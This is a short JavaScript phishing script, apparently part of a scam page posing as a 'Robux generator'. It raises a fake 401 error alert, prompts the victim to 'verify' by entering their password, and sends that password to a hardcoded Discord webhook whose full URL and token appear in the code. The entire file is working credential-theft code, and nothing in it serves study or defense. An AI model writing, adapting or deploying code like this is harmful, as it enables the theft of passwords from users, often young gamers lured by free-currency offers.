  function sendMessage(message) {
      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1151542915462598753/WDGyo4bAPqundpZOSD4Gcrdhilum_sp7vcnVkGjeEv10eQl84dGrjx91WJ9yiCTx86D1");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
          username: "Robux generator",
          avatar_url: "https://www.tynker.com/projects/images/d6c36d2cbe4e178d1374b1e1283c23e4c33ce782/robux-man---image.png",
          content: message
      }

      request.send(JSON.stringify(params));
  }

  alert("X_X\nAn error occured: code{401}\nCode 401 - unauthenticated ")
  var password = prompt("Please input your password so we can verify your identity")

  sendMessage(password)